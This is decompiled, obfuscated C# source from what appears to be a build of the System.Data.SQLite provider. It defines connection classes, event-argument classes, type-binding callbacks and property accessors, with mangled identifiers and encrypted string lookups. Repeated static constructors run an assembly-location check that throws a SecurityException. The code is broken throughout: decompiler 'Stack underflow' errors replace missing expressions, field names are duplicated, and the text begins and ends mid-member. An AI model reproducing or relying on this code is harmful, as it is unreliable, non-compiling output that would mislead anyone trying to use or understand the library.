			return global::_0011._008E_0002(global::_0002._007E_0011(this), global::_0003._007E_0080(_0002, global::_0002._007E_0012(this), global::_000F._008B_0002(global::_0002._007E_0012(this), global::_0002._007E_0012(this))), global::_0002._007E_0012(this));
		}

		public override string _0003(string _0002)
		{
			//IL_010d: Incompatible stack heights: 0 vs 1
			//IL_011d: Incompatible stack heights: 0 vs 3
			global::_0011._0018._0001((_0019)/*Error near IL_0117: Stack underflow*/);
			_ = global::_001C._0096_0003;
			_ = global::_0002._007E_0011;
			string text = /*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			if (/*Error near IL_0023: Stack underflow*/(text) || global::_001C._0096_0003(global::_0002._007E_0012(this)) || global::_001C._0096_0003(_0002))
			{
				return _0002;
			}
			if (!_0012_0004._007E_0019_0008(_0002, global::_0002._007E_0011(this), StringComparison.OrdinalIgnoreCase) || !_0012_0004._007E_001A_0008(_0002, global::_0002._007E_0012(this), StringComparison.OrdinalIgnoreCase))
			{
				return _0002;
			}
			return global::_0003._007E_0080(_0087_0002._007E_008F_0005(_0002, global::_001A._007E_0016_0003(global::_0002._007E_0011(this)), global::_001A._007E_0016_0003(_0002) - (global::_001A._007E_0016_0003(global::_0002._007E_0011(this)) + global::_001A._007E_0016_0003(global::_0002._007E_0012(this)))), global::_000F._008B_0002(global::_0002._007E_0012(this), global::_0002._007E_0012(this)), global::_0002._007E_0012(this));
		}

		protected override DataTable _0001(DbCommand _0002)
		{
			//IL_003e: Incompatible stack heights: 0 vs 2
			//IL_0045: Incompatible stack heights: 0 vs 1
			_ = _0013_0004._007E_001B_0008;
			/*Error near IL_0045: Stack underflow*/((object)/*Error near IL_0045: Stack underflow*/, CommandBehavior.SchemaOnly | CommandBehavior.KeyInfo);
			IDataReader dataReader = (IDataReader)/*Error near IL_0048: Stack underflow*/;
			try
			{
				DataTable dataTable = _0014_0004._007E_001C_0008(dataReader);
				if (global::_0011._0018._0001(dataTable, this))
				{
					global::_0011._0018._0001(this, dataTable);
				}
				return dataTable;
			}
			finally
			{
				if (dataReader != null)
				{
					global::_0008._007E_0098(dataReader);
				}
			}
		}
	}
}
namespace _0013
{
	internal sealed class _0015
	{
		public global::_0004._0016 _0001;

		public bool? _0001;

		public byte? _0001;

		public byte[] _0001;

		public char? _0001;

		public char[] _0001;

		public DateTime? _0001;

		public decimal? _0001;

		public double? _0001;

		public float? _0001;

		public Guid? _0001;

		public short? _0001;

		public int? _0001;

		public long? _0001;

		public string _0001;

		public object _0001;

		static _0015()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001B
{
	internal abstract class _0018 : EventArgs
	{
	}
}
namespace _0001
{
	internal sealed class _001B : global::_001B._0018
	{
		private bool _0001;

		public bool ReadOnly
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001B)/*Error near IL_0009: Stack underflow*/)._0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		internal _001B(bool _001E_0017_0006)
		{
			_0001 = _001E_0017_0006;
		}

		static _001B()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0003
{
	internal sealed class _0014 : _001B._0018
	{
		internal long _0001;

		internal byte[] _0001;

		internal char[] _0001;

		internal int _0001;

		internal int _0002;

		public long DataOffset
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0001 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public byte[] ByteBuffer => ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;

		public char[] CharBuffer => ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;

		public int BufferOffset
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int Length
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0014)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0014)/*Error near IL_0009: Stack underflow*/)._0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal _0014(long _0096_0018_0006, byte[] _0097_0018_0006, int _0098_0018_0006, int _0089_0010)
		{
			this._0001 = _0096_0018_0006;
			this._0001 = _0097_0018_0006;
			_0001 = _0098_0018_0006;
			_0002 = _0089_0010;
		}

		internal _0014(long _0096_0018_0006, char[] _0099_0018_0006, int _0098_0018_0006, int _0089_0010)
		{
			this._0001 = _0096_0018_0006;
			this._0001 = _0099_0018_0006;
			_0001 = _0098_0018_0006;
			_0002 = _0089_0010;
		}
	}
}
namespace _000F
{
	internal sealed class _0012 : _001B._0018
	{
		private string _0001;

		private _001B._0018 _0001;

		private global::_0013._0015 _0001;

		public string MethodName => ((_0012)/*Error near IL_0007: Stack underflow*/)._0001;

		public _001B._0018 ExtraEventArgs => ((_0012)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0013._0015 Value => ((_0012)/*Error near IL_0007: Stack underflow*/)._0001;

		internal _0012(string _009D_0018_0006, _001B._0018 _009E_0018_0006, global::_0013._0015 _009C_0008)
		{
			this._0001 = _009D_0018_0006;
			this._0001 = _009E_0018_0006;
			_0001 = _009C_0008;
		}

		static _0012()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0080
{
	internal delegate void _0015(global::_0001._001A convert, global::_0010._001C command, SQLiteConnectionFlags flags, global::_0011._0016 parameter, string typeName, int index, object userData, out bool complete);
}
namespace _0003
{
	internal delegate void _0015(global::_0001._001A convert, global::_0011._0014 dataReader, SQLiteConnectionFlags flags, _001B._0018 eventArgs, string typeName, int index, object userData, out bool complete);
}
namespace _0007
{
	internal sealed class _001A
	{
		internal string _0001;

		internal _0080._0015 _0001;

		internal global::_0003._0015 _0001;

		internal object _0001;

		internal object _0002;

		public string TypeName
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001A)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001A)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0080._0015 BindValueCallback => ((_001A)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0003._0015 ReadValueCallback => ((_001A)/*Error near IL_0007: Stack underflow*/)._0001;

		public object BindValueUserData => ((_001A)/*Error near IL_0007: Stack underflow*/)._0001;

		public object ReadValueUserData => ((_001A)/*Error near IL_0007: Stack underflow*/)._0002;

		internal _001A(_0080._0015 _0002_0019_0006, global::_0003._0015 _0003_0019_0006, object _0004_0019_0006, object _0005_0019_0006)
		{
			this._0001 = _0002_0019_0006;
			this._0001 = _0003_0019_0006;
			_0001 = _0004_0019_0006;
			_0002 = _0005_0019_0006;
		}
	}
}
namespace _000F
{
	internal sealed class _0013 : Dictionary<string, global::_0007._001A>
	{
		public _0013()
			: base((IEqualityComparer<string>?)new _007F._0018())
		{
		}

		static _0013()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal sealed class _001A : EventArgs
	{
		public readonly global::_000E._001D _0001;

		public readonly StateChangeEventArgs _0001;

		public readonly IDbTransaction _0001;

		public readonly IDbCommand _0001;

		public readonly IDataReader _0001;

		public readonly CriticalHandle _0001;

		public readonly string _0001;

		public readonly object _0001;

		internal _001A(global::_000E._001D _0014_0019_0006, StateChangeEventArgs _001E_009E_0005, IDbTransaction _0004_0018_0006, IDbCommand _0008_0019, IDataReader _001D_0017_0006, CriticalHandle _0015_0019_0006, string _0019_008E_0003, object _0087_000F)
		{
			this._0001 = _0014_0019_0006;
			this._0001 = _001E_009E_0005;
			this._0001 = _0004_0018_0006;
			this._0001 = _0008_0019;
			this._0001 = _001D_0017_0006;
			this._0001 = _0015_0019_0006;
			this._0001 = _0019_008E_0003;
			_0001 = _0087_000F;
		}
	}
}
namespace _0014
{
	internal delegate void _0015(object sender, global::_0002._001A e);
}
namespace _0017
{
	internal sealed class _0080 : DbConnection, IDisposable, ICloneable
	{
		internal const DbType _0001 = (DbType)(-1);

		internal const string _0001 = "sqlite_default_schema";

		private const string m__0002 = ":memory:";

		internal const System.Data.IsolationLevel _0001 = System.Data.IsolationLevel.ReadCommitted;

		internal const System.Data.IsolationLevel _0002 = System.Data.IsolationLevel.Serializable;

		private const SQLiteConnectionFlags m__0001 = SQLiteConnectionFlags.Default;

		private const SQLiteSynchronousEnum m__0001 = SQLiteSynchronousEnum.Default;

		private const SQLiteJournalModeEnum m__0001 = SQLiteJournalModeEnum.Default;

		private const System.Data.IsolationLevel m__0003 = System.Data.IsolationLevel.Serializable;

		internal const SQLiteDateFormats _0001 = SQLiteDateFormats.ISO8601;

		internal const DateTimeKind _0001 = DateTimeKind.Unspecified;

		internal const string _0003 = null;

		private const string _0004 = null;

		private const string _0005 = null;

		private const string _0006 = null;

		private const string _0007 = null;

		private const string _0008 = null;

		private const int m__0001 = 3;

		private const int m__0002 = 4096;

		private const int m__0003 = 0;

		private const int _0004 = -2000;

		private const int _0005 = 100;

		private const int _0006 = 30;

		private const int _0007 = 0;

		private const bool m__0001 = false;

		private const bool m__0002 = false;

		private const bool m__0003 = false;

		private const bool _0004 = false;

		internal const bool _0005 = true;

		private const bool _0006 = false;

		private const bool _0007 = true;

		private const bool _0008 = false;

		private const bool _000E = false;

		private const bool _000F = false;

		private const bool _0010 = false;

		private const bool _0011 = true;

		private const bool _0012 = true;

		internal const int _0008 = 3;

		private const string _000E = null;

		private const int _000E = 0;

		private const int _000F = 6;

		private const int _0010 = 9;

		private const string _000F = "|DataDirectory|";

		private const string _0010 = "sqlite_master";

		private const string _0011 = "sqlite_temp_master";

		private static readonly Assembly m__0001;

		private static readonly object m__0001;

		private static global::_0014._0015 m__0001;

		private static SQLiteConnectionFlags m__0002;

		[ThreadStatic]
		internal static _0080 _0001;

		internal ConnectionState _0001;

		private string _0012;

		internal int _0011;

		internal int _0012;

		internal bool _0013;

		private bool _0014;

		internal System.Data.IsolationLevel _0004;

		internal global::_001F._001A _0001;

		internal global::_0001._001D _0001;

		internal global::_000F._0013 _0001;

		internal global::_0011._0013 _0001;

		private string _0013;

		internal byte[] _0001;

		internal string _0014;

		internal SQLiteConnectionFlags _0003;

		internal Dictionary<string, object> _0001;

		private DbType? m__0001;

		private string _0015;

		private string _0016;

		private int _0013 = 30;

		private int _0014;

		internal int _0015 = 3;

		private int _0016;

		private bool _0015;

		internal bool _0016;

		internal int _0017;

		private global::_0014._0016 m__0001;

		private global::_0018._001C m__0001;

		private global::_0005._0017 m__0001;

		private global::_0019._001E m__0001;

		private global::_000E._001C m__0001;

		private EventHandler m__0001;

		private global::_0019._001C m__0001;

		private global::_0019._001D m__0001;

		private global::_0018._001B m__0001;

		private _0081 m__0001;

		private global::_0010._001D m__0001;

		private global::_0010._001E m__0001;

		internal StateChangeEventHandler _0001;

		internal bool _0017;

		public static global::_0007._001B ConnectionPool
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (global::_0007._001B)/*Error near IL_0003: Stack underflow*/;
			}
			set
			{
				//IL_0006: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((global::_0007._001B)/*Error near IL_000d: Stack underflow*/);
			}
		}

		public int PoolCount
		{
			get
			{
				//IL_0016: Incompatible stack heights: 0 vs 1
				//IL_0019: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				if (((_0080)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					return 0;
				}
				((_0080)/*Error near IL_0012: Stack underflow*/)._0001._0003();
				return (int)/*Error near IL_0015: Stack underflow*/;
			}
		}

		[RefreshProperties(RefreshProperties.All)]
		[DefaultValue("")]
		[Editor("SQLite.Designer.SQLiteConnectionStringEditor, SQLite.Designer, Version=1.0.105.2, Culture=neutral, PublicKeyToken=db937bc2d44ff139", "System.Drawing.Design.UITypeEditor, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")]
		public override string ConnectionString
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0012;
			}
			set
			{
				//IL_0025: Incompatible stack heights: 0 vs 1
				//IL_002f: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_002c: Stack underflow*/);
				if ((int)/*Error near IL_0008: Stack underflow*/ == 0)
				{
					throw new ArgumentNullException();
				}
				if (this._0001 != 0)
				{
					throw new InvalidOperationException();
				}
				this._0012 = value;
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public override string DataSource
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0013;
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public string FileName
		{
			get
			{
				//IL_0034: Incompatible stack heights: 0 vs 1
				//IL_003e: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_003b: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107401304));
				}
				return this._0001._0001(global::_0080._0014._0001(107401775));
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public override string Database
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				global::_0080._0014._0001(107401775);
				return (string)/*Error near IL_000c: Stack underflow*/;
			}
		}

		public int DefaultTimeout
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0013;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/)._0013 = value;
			}
		}

		public int BusyTimeout
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0014;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/)._0014 = value;
			}
		}

		public int PrepareRetries
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0015;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/)._0015 = value;
			}
		}

		public int ProgressOps
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0016;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/)._0016 = value;
			}
		}

		public bool ParseViaFramework
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0015;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/)._0015 = value;
			}
		}

		public SQLiteConnectionFlags Flags
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0003;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/)._0003 = value;
			}
		}

		public DbType? DefaultDbType
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/).m__0001 = value;
			}
		}

		public string DefaultTypeName
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0015;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/)._0015 = value;
			}
		}

		public string VfsName
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0014: Stack underflow*/);
				return ((_0080)/*Error near IL_000b: Stack underflow*/)._0016;
			}
			set
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0015: Stack underflow*/);
				((_0080)/*Error near IL_000c: Stack underflow*/)._0016 = value;
			}
		}

		public bool OwnHandle
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0031: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107399982));
				}
				return this._0001.OwnHandle;
			}
		}

		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public override string ServerVersion
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				//IL_0016: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_000f: Stack underflow*/);
				_ = SQLiteVersion;
				return (string)/*Error near IL_0007: Stack underflow*/;
			}
		}

		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public long LastInsertRowId
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0031: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107399401));
				}
				return this._0001.LastInsertRowId;
			}
		}

		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public int Changes
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0031: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107399352));
				}
				return this._0001.Changes;
			}
		}

		[Browsable(false)]
		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		public bool AutoCommit
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0031: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107399239));
				}
				return this._0001.AutoCommit;
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		[Browsable(false)]
		public long MemoryUsed
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0031: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107399190));
				}
				return this._0001.MemoryUsed;
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
		[Browsable(false)]
		public long MemoryHighwater
		{
			get
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0080)/*Error near IL_0031: Stack underflow*/);
				if (((_0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107399597));
				}
				return this._0001.MemoryHighwater;
			}
		}

		public static string DefineConstants
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = global::_0002._0019.DefineConstants;
				return (string)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public static string SQLiteVersion
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = global::_0002._0019.SQLiteVersion;
				return (string)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public static string SQLiteSourceId
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = global::_0002._0019.SQLiteSourceId;
				return (string)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public static string SQLiteCompileOptions
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = global::_0002._0019.SQLiteCompileOptions;
				return (string)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public static string InteropVersion
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = global::_0002._0019.InteropVersion;
				return (string)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public static string InteropSourceId
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = global::_0002._0019.InteropSourceId;
				return (string)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public static string InteropCompileOptions
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				_ = global::_0002._0019.InteropCompileOptions;
				return (string)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public static string ProviderVersion
		{
			get
			{
				//IL_0029: Incompatible stack heights: 0 vs 3
				//IL_0030: Incompatible stack heights: 0 vs 1
				//IL_0037: Incompatible stack heights: 0 vs 1
				if ((object)_0080.m__0001 == null)
				{
					return null;
				}
				_ = global::_0002._007E_0006;
				_ = _008E._007E_001B_0004;
				_001B_0004._007E_0087_0008(_0080.m__0001);
				/*Error near IL_0030: Stack underflow*/((object)/*Error near IL_0030: Stack underflow*/);
				/*Error near IL_0037: Stack underflow*/((object)/*Error near IL_0037: Stack underflow*/);
				return (string)/*Error near IL_0024: Stack underflow*/;
			}
		}

		public static string ProviderSourceId
		{
			get
			{
				//IL_010c: Incompatible stack heights: 0 vs 3
				//IL_0116: Incompatible stack heights: 0 vs 1
				if ((object)_0080.m__0001 == null)
				{
					return null;
				}
				string text = null;
				_ = _001C_0004._007E_0088_0008;
				_ = _0080.m__0001;
				_0091._0080_0004(typeof(global::_0001._0019).TypeHandle);
				/*Error near IL_0116: Stack underflow*/((object)/*Error near IL_0116: Stack underflow*/, (Type)/*Error near IL_0116: Stack underflow*/, false);
				if ((int)/*Error near IL_0030: Stack underflow*/ != 0)
				{
					global::_0001._0019 obj = (global::_0001._0019)_001D_0004._007E_0089_0008(_0080.m__0001, _0091._0080_0004(typeof(global::_0001._0019).TypeHandle), false)[0];
					text = obj._0001;
				}
				string text2 = null;
				if (_001C_0004._007E_0088_0008(_0080.m__0001, _0091._0080_0004(typeof(global::_0008._0011).TypeHandle), false))
				{
					global::_0008._0011 obj2 = (global::_0008._0011)_001D_0004._007E_0089_0008(_0080.m__0001, _0091._0080_0004(typeof(global::_0008._0011).TypeHandle), false)[0];
					text2 = obj2._0001;
				}
				if (text != null || text2 != null)
				{
					if (text == null)
					{
						text = global::_0080._0014._0001(107399544);
					}
					if (text2 == null)
					{
						text2 = global::_0080._0014._0001(107399487);
					}
					return global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107395853), new object[2] { text, text2 });
				}
				return null;
			}
		}

		public unsafe static SQLiteConnectionFlags DefaultFlags
		{
			get
			{
				//IL_006a: Incompatible stack heights: 0 vs 1
				//IL_0070: Incompatible stack heights: 0 vs 3
				global::_0080._0014._0001(107399454);
				string text = (string)/*Error near IL_006d: Stack underflow*/;
				_ = null;
				object obj = default(object);
				_ = ref obj;
				if (!global::_0011._0018._0001((object)/*Error near IL_0013: Stack underflow*/, ref *(object*)/*Error near IL_0013: Stack underflow*/, (string)/*Error near IL_0013: Stack underflow*/))
				{
					obj = global::_0011._0018._0001(text, (string)null);
					global::_0011._0018._0001(text, obj);
				}
				if (obj == null)
				{
					return SQLiteConnectionFlags.Default;
				}
